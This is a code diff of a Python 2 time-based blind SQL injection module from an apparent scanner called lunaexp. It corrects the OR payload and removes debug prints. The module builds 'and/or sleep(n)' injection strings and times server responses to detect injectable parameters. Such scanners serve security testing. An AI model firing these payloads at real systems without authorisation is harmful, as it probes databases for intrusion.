@@ -42,7 +42,7 @@ class timebased_sqli(lunaexp.base):
         self.time_base_times = sleep_time
         self.time_base_delaytime = sleep_time
         self.time_base_exp_and = [""+self.and_or[0]+" sleep("+str(self.time_base_delaytime)+")"]
-        self.time_base_exp_or = [""+self.and_or[0]+" sleep("+str(self.time_base_delaytime)+")"]
+        self.time_base_exp_or = [""+self.and_or[1]+" sleep("+str(self.time_base_delaytime)+")"]
 
         self.luna_output = output.output()                                                       #cmd out control
         self.luna_conf = conf.lunaconf.lunaconf()                                                #load conf
@@ -81,10 +81,7 @@ class timebased_sqli(lunaexp.base):
                 continue
 
 
-            print time_number_1
-            print time_number_3
-            print time_number_5
-            print time_number_7
+
             new_time_1 = time_number_1 / 1.0 
             new_time_3 = time_number_3 / 3.0 
             new_time_5 = time_number_5 / 5.0 
@@ -105,7 +102,7 @@ class timebased_sqli(lunaexp.base):
        
     def scan_1357(timebased_sqli, tb_s , luna_scan , scan_type, urlencode_type , c_p , c_s):
         tb_s.value_exp = c_p+tb_s.time_base_exp_or[0] + c_s
-        print tb_s.value_exp
+        #print tb_s.value_exp
         a= time.time()
         status,header,data = luna_scan.scan_for_all(tb_s,0,scan_type,urlencode_type)
         b= time.time()
